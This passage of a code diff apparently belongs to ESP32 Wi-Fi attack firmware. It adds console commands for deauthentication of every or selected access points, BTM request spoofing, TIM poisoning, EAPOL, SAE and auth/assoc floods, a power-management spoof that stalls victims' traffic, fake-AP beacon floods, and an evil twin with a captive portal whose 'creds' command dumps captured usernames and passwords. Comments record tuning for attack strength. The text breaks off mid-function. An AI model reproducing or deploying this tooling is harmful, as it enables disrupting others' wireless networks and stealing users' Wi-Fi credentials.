@@ -6,13 +6,24 @@
 // serial_console.cpp until it gets the same treatment -- one command at a time,
 // never a big-bang.
 #include <WiFi.h>
+#include <ctype.h>
+#include <esp_wifi.h>
+#include <stdio.h>
 #include <string.h>
 
+#include "authflood.h"
 #include "console_commands.h"
 #include "csa.h"
 #include "deauth.h"
 #include "delba.h"
+#include "eapol.h"
+#include "evil_twin.h"
+#include "pspoll.h"
+#include "radio.h"
+#include "sae.h"
+#include "tim.h"
 #include "wbus.h"
+#include "wnm.h"
 
 namespace {
 
@@ -72,6 +83,14 @@ wb_err_t deauth_bus_stop(const wb_args_t*, wb_reply_t* reply) {
   return WB_OK;
 }
 
+// Defined further down with the other deauth extras; the method table above needs
+// them first.
+extern const wb_arg_spec_t kDeauthAllArgs[];
+extern const wb_arg_spec_t kDeauthListArgs[];
+wb_err_t deauth_bus_all(const wb_args_t* args, wb_reply_t* reply);
+wb_err_t deauth_bus_only(const wb_args_t* args, wb_reply_t* reply);
+wb_err_t deauth_bus_except(const wb_args_t* args, wb_reply_t* reply);
+
 const wb_method_t kDeauthMethods[] = {
     {.name = "start",
      .args = kDeauthStartArgs,
@@ -83,6 +102,21 @@ const wb_method_t kDeauthMethods[] = {
      .n_args = 0,
      .handler = deauth_bus_stop,
      .summary = "STOP"},
+    {.name = "all",
+     .args = kDeauthAllArgs,
+     .n_args = 1,
+     .handler = deauth_bus_all,
+     .summary = "deauth every scanned AP"},
+    {.name = "only",
+     .args = kDeauthListArgs,
+     .n_args = 2,
+     .handler = deauth_bus_only,
+     .summary = "deauth only the listed scan indexes"},
+    {.name = "except",
+     .args = kDeauthListArgs,
+     .n_args = 2,
+     .handler = deauth_bus_except,
+     .summary = "deauth every AP except the listed indexes"},
 };
 
 // ---- CSA --------------------------------------------------------------------
@@ -489,6 +523,660 @@ const wb_method_t kBaMethods[] = {
     {.name = "test", .args = nullptr, .n_args = 0, .handler = ba_bus_test, .summary = "dump the forged ADDBA / BAR bytes"},
 };
 
+// ---- shared helpers ---------------------------------------------------------
+
+// The bus parses values, but a few legacy tokens are "any word, compared
+// case-insensitively" (noauto, poll/both, frame shapes). Keeping the helper here
+// avoids exporting str_ieq from the component.
+bool token_eq(const char* a, const char* b) {
+  if (a == nullptr || b == nullptr) return false;
+  while (*a != 0 && *b != 0) {
+    if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
+    a++;
+    b++;
+  }
+  return *a == 0 && *b == 0;
+}
+
+void mac_text(const uint8_t mac[6], char out[18]) {
+  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
+           mac[5]);
+}
+
+// ---- WNM (802.11v BTM Request) ----------------------------------------------
+
+const wb_arg_spec_t kWnmStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "cand|bare",
+     .label = "cand = with a phantom candidate list, bare = without",
+     .err = "mode must be 'cand' (candidate list) or 'bare'", .def = 0, .min = 0, .max = 0},
+    // timer/ch are JUNK_ZERO so that "abc" behaves like strtol's 0 and the handler's
+    // own check (with its own wording) still runs after the index check.
+    {.name = "timer", .type = WB_T_INT, .flags = WB_F_JUNK_ZERO, .enums = nullptr,
+     .label = "disassociation timer in TBTT (1..65535)", .err = nullptr, .def = 10, .min = 0,
+     .max = 0},
+    {.name = "ch", .type = WB_T_INT, .flags = WB_F_JUNK_ZERO, .enums = nullptr,
+     .label = "candidate channel 0..196 (0 = pick one)", .err = nullptr, .def = 0, .min = 0,
+     .max = 0},
+    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "target station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
+     .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t wnm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const wb_value_t* mode_arg = wb_arg(args, "mode");
+  const wnm_mode_t mode =
+      (mode_arg != nullptr && mode_arg->text != nullptr && strcmp(mode_arg->text, "bare") == 0)
+          ? WNM_MODE_BARE
+          : WNM_MODE_CAND;
+  const long timer = wb_arg_num(args, "timer");
+  if (timer < 1 || timer > 65535) {
+    wb_reply_line(reply, "ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
+    return WB_ERR_ARG;
+  }
+  const long ch = wb_arg_num(args, "ch");
+  if (ch < 0 || ch > 196) {
+    wb_reply_line(reply, "ERR candidate channel must be 0..196 (0 = pick one)");
+    return WB_ERR_ARG;
+  }
+  uint8_t sta[6];
+  const bool have_sta = wb_arg_mac(args, "sta", sta);
+  attack_stop();
+  if (!wnm_start(index, mode, (uint16_t)timer, (uint8_t)ch)) {
+    wb_reply_line(reply, "ERR cannot start the BTM spoof on that network");
+    return WB_ERR_STATE;
+  }
+  if (have_sta) {
+    wnm_add_station(sta);
+    char text[18];
+    mac_text(sta, text);
+    wb_reply_printf(reply, "OK WNMSTA %s\n", text);
+  }
+  wb_reply_printf(reply, "OK WNM %d mode=%s timer=%u cand_ch=%u ssid=%s\n", index,
+                  wnm_mode_name(), (unsigned)timer, (unsigned)wnm_candidate_channel(),
+                  WiFi.SSID(index).c_str());
+  console_ui_log("wnm started");
+  wbus_emit("wnm.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t wnm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = wnm_frames();
+  const uint32_t responses = wnm_responses();
+  wnm_stop();
+  wb_reply_printf(reply, "OK WNMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
+                  (unsigned)responses, (unsigned)wnm_last_status());
+  console_ui_log("wnm stopped");
+  wbus_emit("wnm.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t wnm_bus_test(const wb_args_t*, wb_reply_t*) {
+  wnm_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kWnmMethods[] = {
+    {.name = "start", .args = kWnmStartArgs, .n_args = 5, .handler = wnm_bus_start,
+     .summary = "802.11v BTM Request spoof"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = wnm_bus_stop, .summary = "stop the BTM spoof"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = wnm_bus_test, .summary = "dump the BTM Request bytes"},
+};
+
+// ---- TIM poisoning ----------------------------------------------------------
+
+const wb_arg_spec_t kTimStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "tim|clear",
+     .label = "tim = set the AID bit(s), clear = empty the bitmap",
+     .err = "mode must be tim|clear", .def = 0, .min = 0, .max = 0},
+    {.name = "aid", .type = WB_T_INT, .flags = WB_F_JUNK_ZERO, .enums = nullptr,
+     .label = "AID 0..255 (0 = every learned AID)", .err = nullptr, .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t tim_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const wb_value_t* mode_arg = wb_arg(args, "mode");
+  const tim_mode_t mode =
+      (mode_arg != nullptr && mode_arg->text != nullptr && strcmp(mode_arg->text, "clear") == 0)
+          ? TIM_CLEAR
+          : TIM_SET;
+  const long aid = wb_arg_num(args, "aid");
+  if (aid < 0 || aid > 255) {
+    wb_reply_line(reply, "ERR aid must be 0..255 (0 = every learned AID)");
+    return WB_ERR_ARG;
+  }
+  attack_stop();
+  if (!tim_start(index, mode, (uint16_t)aid)) {
+    wb_reply_line(reply, "ERR cannot start the beacon clone on that network");
+    return WB_ERR_STATE;
+  }
+  wb_reply_printf(reply, "OK TIM %d mode=%s aid=%ld ch=%u\n", index, tim_mode_name(), aid,
+                  (unsigned)WiFi.channel(index));
+  console_ui_log("tim clone started");
+  wbus_emit("tim.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t tim_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = tim_frames();
+  const uint32_t real = tim_real_beacons();
+  tim_stop();
+  wb_reply_printf(reply, "OK TIMSTOP frames=%u real_beacons=%u\n", (unsigned)frames, (unsigned)real);
+  console_ui_log("tim clone stopped");
+  wbus_emit("tim.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t tim_bus_test(const wb_args_t*, wb_reply_t*) {
+  tim_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kTimMethods[] = {
+    {.name = "start", .args = kTimStartArgs, .n_args = 3, .handler = tim_bus_start,
+     .summary = "tamper the TIM element of a cloned beacon"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = tim_bus_stop, .summary = "stop the beacon clone"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = tim_bus_test, .summary = "dump the cloned beacon (TIM check)"},
+};
+
+// ---- EAPOL-Start / Logoff flood ---------------------------------------------
+
+const wb_arg_spec_t kEapolStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "tid", .type = WB_T_INT, .flags = WB_F_JUNK_ZERO, .enums = nullptr,
+     .label = "QoS TID -1..7 (-1 = plain data frames only)", .err = nullptr, .def = 6, .min = 0,
+     .max = 0},
+    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "forged station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
+     .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t eapol_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const long tid = wb_arg_num(args, "tid");
+  if (tid < -1 || tid > 7) {
+    wb_reply_line(reply, "ERR tid must be -1 (plain data only) or 0..7");
+    return WB_ERR_ARG;
+  }
+  uint8_t sta[6];
+  const bool have_sta = wb_arg_mac(args, "sta", sta);
+  attack_stop();
+  if (!eapol_start(index, (int8_t)tid)) {
+    wb_reply_line(reply, "ERR cannot start the EAPOL flood on that network");
+    return WB_ERR_STATE;
+  }
+  if (have_sta) eapol_add_station(sta);
+  wb_reply_printf(reply, "OK EAPOL %d tid=%ld ch=%u ssid=%s\n", index, tid,
+                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
+  console_ui_log("eapol flood started");
+  wbus_emit("eapol.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t eapol_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = eapol_frames();
+  const uint32_t rx = eapol_rx_from_ap();
+  const uint32_t rxsta = eapol_rx_from_sta();
+  eapol_stop();
+  wb_reply_printf(reply, "OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
+                  (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
+  console_ui_log("eapol stopped");
+  wbus_emit("eapol.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t eapol_bus_test(const wb_args_t*, wb_reply_t*) {
+  eapol_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kEapolMethods[] = {
+    {.name = "start", .args = kEapolStartArgs, .n_args = 3, .handler = eapol_bus_start,
+     .summary = "EAPOL-Start/Logoff flood as a forged station"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = eapol_bus_stop, .summary = "stop the EAPOL flood"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = eapol_bus_test, .summary = "dump the EAPOL data frames"},
+};
+
+// ---- PS bit (power management) spoof ----------------------------------------
+
+// Three free-form slots: the victim MAC and the frame shape may come in any order,
+// which is why they are WB_T_STR and classified here instead of by the policy.
+const wb_arg_spec_t kPspollStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "a", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
+    {.name = "b", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
+    {.name = "c", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t pspoll_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  uint8_t sta[6];
+  bool have_sta = false;
+  // QoS Null is the default: it measured strongest on the bench (-38% vs -30% for
+  // plain Null Data and -21% for the Action shape, 测试报告 §4.4.10).
+  pspoll_frame_t shape = PSPOLL_FRAME_QOSNULL;
+  const char* names[3] = {"a", "b", "c"};
+  for (int i = 0; i < 3; i++) {
+    const wb_value_t* value = wb_arg(args, names[i]);
+    if (value == nullptr || !value->present || value->text == nullptr) continue;
+    const char* token = value->text;
+    if (token_eq(token, "null")) {
+      shape = PSPOLL_FRAME_NULL;
+    } else if (token_eq(token, "qosnull") || token_eq(token, "qos")) {
+      shape = PSPOLL_FRAME_QOSNULL;
+    } else if (token_eq(token, "action") || token_eq(token, "act")) {
+      shape = PSPOLL_FRAME_ACTION;
+    } else if (wb_parse_mac(token, sta)) {
+      // Tested before any numeric branch: "02AABBCCDDEE" starts with a digit.
+      have_sta = true;
+    } else if (token_eq(token, "poll") || token_eq(token, "both")) {
+      wb_reply_line(reply,
+                    "ERR poll/both are gone: a unicast PS-Poll never leaves this MAC"
+                    " (CTRLTEST 10 bssid 0xC025 -> 0/10 on the air).");
+      return WB_ERR_ARG;
+    } else {
+      wb_reply_printf(reply,
+                      "ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac]"
+                      " [null|qosnull|action])\n",
+                      token);
+      return WB_ERR_ARG;
+    }
+  }
+  attack_stop();
+  if (!pspoll_start(index, shape)) {
+    wb_reply_line(reply, "ERR cannot start the PM-bit spoof on that network");
+    return WB_ERR_STATE;
+  }
+  char sta_out[18];
+  sta_out[0] = 0;
+  if (have_sta) {
+    pspoll_add_station(sta);
+    mac_text(sta, sta_out);
+  }
+  const int32_t chan_err = pspoll_channel_err();
+  wb_reply_printf(reply, "OK PSPOLL %d mode=%s frame=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
+                  pspoll_mode_name(), pspoll_frame_name(),
+                  sta_out[0] ? sta_out : "learned", (unsigned)WiFi.channel(index), (int)chan_err,
+                  WiFi.SSID(index).c_str());
+  if (chan_err != 0) {
+    wb_reply_printf(reply,
+                    "WARN chset=%d: the channel change was refused (a scan still running?),"
+                    " frames go out on the current channel\n",
+                    (int)chan_err);
+  }
+  console_ui_log("pm-bit spoof started");
+  wbus_emit("pspoll.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t pspoll_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = pspoll_frames();
+  const uint32_t nulls = pspoll_null_frames();
+  const uint32_t flushes = pspoll_flush_frames();
+  const uint32_t dl = pspoll_dl_frames();
+  pspoll_stop();
+  wb_reply_printf(reply, "OK PSPOLLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
+                  (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
+  console_ui_log("pm-bit spoof stopped");
+  wbus_emit("pspoll.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t pspoll_bus_release(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t clients = pspoll_clients();
+  const uint32_t before = pspoll_flush_frames();
+  pspoll_release();
+  wb_reply_printf(reply, "OK PSPOLLREL clients=%u flushed=%u\n", (unsigned)clients,
+                  (unsigned)(pspoll_flush_frames() - before));
+  console_ui_log("pm=0 release sent");
+  wbus_emit("pspoll.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t pspoll_bus_test(const wb_args_t*, wb_reply_t*) {
+  pspoll_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kPspollMethods[] = {
+    {.name = "start", .args = kPspollStartArgs, .n_args = 4, .handler = pspoll_bus_start,
+     .summary = "PM-bit spoof: make the AP buffer a victim's downlink"},
+    {.name = "release", .args = nullptr, .n_args = 0, .handler = pspoll_bus_release,
+     .summary = "send PM=0 to every victim, then stop"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = pspoll_bus_stop,
+     .summary = "stop the PM-bit spoof without a release"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = pspoll_bus_test,
+     .summary = "dump all three shapes (PM=1 / PM=0)"},
+};
+
+// ---- SAE commit flood -------------------------------------------------------
+
+const wb_arg_spec_t kSaeStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "elem", .type = WB_T_ENUM, .flags = 0, .enums = "point|rand",
+     .label = "point = real P-256 generator, rand = garbage control",
+     .err = "element must be 'point' (P-256 generator) or 'rand'", .def = 0, .min = 0, .max = 0},
+    {.name = "gap", .type = WB_T_INT, .flags = WB_F_JUNK_ZERO, .enums = nullptr,
+     .label = "gap between commits in ms (0..1000)", .err = nullptr, .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t sae_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const wb_value_t* elem = wb_arg(args, "elem");
+  const sae_element_t element =
+      (elem != nullptr && elem->text != nullptr && strcmp(elem->text, "rand") == 0)
+          ? SAE_ELEM_RANDOM
+          : SAE_ELEM_BASEPOINT;
+  const long gap = wb_arg_num(args, "gap");
+  if (gap < 0 || gap > 1000) {
+    wb_reply_line(reply, "ERR gap_ms must be 0..1000");
+    return WB_ERR_ARG;
+  }
+  attack_stop();
+  if (!sae_start(index, element, (uint32_t)gap)) {
+    wb_reply_line(reply, "ERR cannot start the SAE flood on that network");
+    return WB_ERR_STATE;
+  }
+  if (gap > 0 && gap < 50) {
+    // The pool drains at ~32 frames/s; faster than 20 frames/s fills it in a couple
+    // of seconds and the chip restarts (0x101 rule).
+    wb_reply_printf(reply, "INFO SAE gap_ms=%ld raised to %u (unicast pool drains at ~32 frames/s)\n",
+                    gap, (unsigned)sae_gap_ms());
+  }
+  wb_reply_printf(reply, "OK SAE %d elem=%s gap_ms=%u ch=%u\n", index,
+                  element == SAE_ELEM_BASEPOINT ? "point" : "rand", (unsigned)sae_gap_ms(),
+                  (unsigned)WiFi.channel(index));
+  console_ui_log("sae flood started");
+  wbus_emit("sae.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t sae_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = sae_frames();
+  const uint32_t resp = sae_responses();
+  const uint32_t tokens = sae_tokens();
+  sae_stop();
+  wb_reply_printf(reply, "OK SAESTOP frames=%u identities=%u responses=%u tokens=%u echoed=%u\n",
+                  (unsigned)frames, (unsigned)sae_identities(), (unsigned)resp, (unsigned)tokens,
+                  (unsigned)sae_echoed());
+  console_ui_log("sae stopped");
+  wbus_emit("sae.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t sae_bus_test(const wb_args_t*, wb_reply_t*) {
+  sae_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kSaeMethods[] = {
+    {.name = "start", .args = kSaeStartArgs, .n_args = 3, .handler = sae_bus_start,
+     .summary = "SAE Commit flood (WPA3), echoes anti-clogging tokens"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = sae_bus_stop, .summary = "stop the SAE flood"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = sae_bus_test, .summary = "dump the SAE Commit bytes"},
+};
+
+// ---- auth / assoc flood -----------------------------------------------------
+
+const wb_arg_spec_t kAuthfloodStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "both|auth|assoc",
+     .label = "which frames to flood", .err = "mode must be both|auth|assoc", .def = 0, .min = 0,
+     .max = 0},
+    // Free-form, not enum: any token other than "noauto" means "auto upgrade on".
+    {.name = "noauto", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "pass 'noauto' to keep a WPA3 AP on auth/assoc only", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
+};
+
+wb_err_t authflood_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const wb_value_t* mode_arg = wb_arg(args, "mode");
+  authflood_mode_t mode = AUTHFLOOD_BOTH;
+  if (mode_arg != nullptr && mode_arg->text != nullptr) {
+    if (strcmp(mode_arg->text, "auth") == 0) mode = AUTHFLOOD_AUTH_ONLY;
+    else if (strcmp(mode_arg->text, "assoc") == 0) mode = AUTHFLOOD_ASSOC_ONLY;
+  }
+  const wb_value_t* noauto = wb_arg(args, "noauto");
+  const bool auto_upgrade =
+      !(noauto != nullptr && noauto->present && token_eq(noauto->text, "noauto"));
+  attack_stop();
+  if (!authflood_start(index, mode, auto_upgrade)) {
+    wb_reply_line(reply, "ERR cannot start the auth flood on that network");
+    return WB_ERR_STATE;
+  }
+  wb_reply_printf(reply, "OK AUTHFLOOD %d mode=%s auto=%d ch=%u ssid=%s\n", index,
+                  authflood_mode_name(), auto_upgrade ? 1 : 0, (unsigned)WiFi.channel(index),
+                  WiFi.SSID(index).c_str());
+  console_ui_log("auth flood started");
+  wbus_emit("authflood.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t authflood_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = authflood_frames();
+  const uint32_t status = authflood_last_status();
+  const bool upgraded = authflood_upgraded();
+  authflood_stop();
+  wb_reply_printf(reply, "OK AUTHFLOODSTOP frames=%u identities=%u last_status=%u upgraded=%d\n",
+                  (unsigned)frames, (unsigned)authflood_identities(), (unsigned)status,
+                  upgraded ? 1 : 0);
+  console_ui_log("auth flood stopped");
+  wbus_emit("authflood.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t authflood_bus_test(const wb_args_t*, wb_reply_t*) {
+  authflood_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kAuthfloodMethods[] = {
+    {.name = "start", .args = kAuthfloodStartArgs, .n_args = 3, .handler = authflood_bus_start,
+     .summary = "auth/assoc flood, upgrades to SAE on a WPA3 AP"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = authflood_bus_stop,
+     .summary = "stop the auth/assoc flood"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = authflood_bus_test,
+     .summary = "dump the forged auth/assoc bytes"},
+};
+
+// ---- deauth extras: all / only / except -------------------------------------
+
+const wb_arg_spec_t kDeauthAllArgs[] = {
+    {.name = "reason", .type = WB_T_REASON, .flags = 0, .enums = nullptr,
+     .label = "deauth reason: 1..65535, or random",
+     .err = "reason must be 1..65535, or 'random'", .def = 1, .min = 0, .max = 0},
+};
+
+wb_err_t deauth_bus_all(const wb_args_t* args, wb_reply_t* reply) {
+  uint16_t reason = 1;
+  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
+  if (console_scan_count() == 0) {
+    wb_reply_line(reply, "ERR no AP list, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  if (!attack_deauth_all(reason)) {
+    wb_reply_line(reply, "ERR cannot start deauth-all");
+    return WB_ERR_STATE;
+  }
+  wb_reply_printf(reply, "OK DEAUTH_ALL aps=%d\n", attack_ap_count());
+  console_ui_log("deauth all started");
+  wbus_emit("deauth.state", "active=1");
+  return WB_OK;
+}
+
+const wb_arg_spec_t kDeauthListArgs[] = {
+    {.name = "list", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "comma separated scan indexes, e.g. 1,3,5", .err = nullptr, .def = 0, .min = 0,
+     .max = 0},
+    {.name = "reason", .type = WB_T_REASON, .flags = 0, .enums = nullptr,
+     .label = "deauth reason: 1..65535, or random",
+     .err = "reason must be 1..65535, or 'random'", .def = 1, .min = 0, .max = 0},
+};
+
+wb_err_t deauth_bus_list(const wb_args_t* args, wb_reply_t* reply, bool except) {
+  const wb_value_t* list = wb_arg(args, "list");
+  int indexes[MAX_AP_TARGETS];
+  const int count = console_parse_index_list(list != nullptr ? const_cast<char*>(list->text) : nullptr,
+                                             indexes, MAX_AP_TARGETS);
+  if (count == 0) {
+    wb_reply_line(reply, "ERR need an index list, e.g. DEAUTH_ONLY 1,3,5");
+    return WB_ERR_ARG;
+  }
+  uint16_t reason = 1;
+  // The legacy order applied the reason before the list/scan checks; keep it so an
+  // out-of-set reason still prints its INFO line first.
+  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
+  if (console_scan_count() == 0) {
+    wb_reply_line(reply, "ERR no AP list, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const bool ok = except ? attack_deauth_except(indexes, count, reason)
+                         : attack_deauth_only(indexes, count, reason);
+  if (!ok) {
+    wb_reply_line(reply, "ERR cannot start that deauth set");
+    return WB_ERR_STATE;
+  }
+  wb_reply_printf(reply, "OK %s %d aps\n", except ? "DEAUTH_EXCEPT" : "DEAUTH_ONLY",
+                  attack_ap_count());
+  console_ui_log(except ? "deauth except started" : "deauth only started");
+  wbus_emit("deauth.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t deauth_bus_only(const wb_args_t* args, wb_reply_t* reply) {
+  return deauth_bus_list(args, reply, false);
+}
+
+wb_err_t deauth_bus_except(const wb_args_t* args, wb_reply_t* reply) {
+  return deauth_bus_list(args, reply, true);
+}
+
+// ---- probe broadcast --------------------------------------------------------
+
+wb_err_t probe_bus_broadcast(const wb_args_t*, wb_reply_t* reply) {
+  if (!attack_probe_broadcast()) {
+    wb_reply_line(reply, "ERR cannot start probe broadcast");
+    return WB_ERR_STATE;
+  }
+  wb_reply_line(reply, "OK PROBE_BROADCAST");
+  console_ui_log("probe broadcast started");
+  wbus_emit("probe.state", "active=1");
+  return WB_OK;
+}
+
+const wb_method_t kProbeMethods[] = {
+    {.name = "broadcast", .args = nullptr, .n_args = 0, .handler = probe_bus_broadcast,
+     .summary = "flood fake APs (beacon + probe response)"},
+};
+
+// ---- evil twin --------------------------------------------------------------
+
+const wb_arg_spec_t kEvilStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+};
+
+wb_err_t evil_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    console_ui_log("evil twin: index out of range");
+    return WB_ERR_ARG;
+  }
+  wb_reply_printf(reply, "OK EVILTWIN %d %s\n", index, WiFi.SSID(index).c_str());
+  console_ui_log("evil twin starting");
+  start_evil_twin_attack(index);
+  wbus_emit("evil.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t evil_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  stop_evil_twin();
+  wb_reply_line(reply, "OK EVILTWIN_STOP");
+  console_ui_log("evil twin stopped");
+  wbus_emit("evil.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t evil_bus_creds(const wb_args_t*, wb_reply_t* reply) {
+  wb_reply_line(reply, "CREDS_BEGIN");
+  for (int i = 0; i < captured_count; i++) {
+    wb_reply_printf(reply, "CRED %d %s %s %lu\n", i, captured_creds[i].username,
+                    captured_creds[i].password, captured_creds[i].timestamp);
+  }
+  wb_reply_printf(reply, "CREDS_END %d\n", captured_count);
+  return WB_OK;
+}
+
+const wb_method_t kEvilMethods[] = {
+    {.name = "start", .args = kEvilStartArgs, .n_args = 1, .handler = evil_bus_start,
+     .summary = "clone the AP and open a captive portal"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = evil_bus_stop, .summary = "stop the evil twin"},
+    {.name = "creds", .args = nullptr, .n_args = 0, .handler = evil_bus_creds, .summary = "dump captured credentials (RAM)"},
+};
+
+// ---- radio ------------------------------------------------------------------
+
+wb_err_t radio_bus_status(const wb_args_t*, wb_reply_t* reply) {
+  bool promisc = false;
+  wifi_promiscuous_filter_t type_filter = {0};
+  wifi_promiscuous_filter_t ctrl_filter = {0};
+  uint8_t prim = 0;
+  wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+  const esp_err_t e1 = esp_wifi_get_promiscuous(&promisc);
